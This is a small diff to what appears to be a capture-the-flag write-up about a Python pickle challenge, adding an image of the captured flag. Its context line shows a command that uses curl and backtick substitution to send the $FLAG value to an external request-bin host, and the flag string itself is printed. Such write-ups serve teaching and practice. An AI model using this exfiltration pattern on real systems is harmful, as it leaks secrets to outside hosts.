@@ -43,4 +43,6 @@ cmd = ("curl https://en1rz2m58frpb.x.pipedream.net/`echo $FLAG`")
 
 If we give that a try, we immediately see a response on our request bin:
 
+<img src="flag.png" alt="Server-side flag forgery." width="600">
+
 And there's our flag: `actf{you_got_yourself_out_of_a_pickle}`.
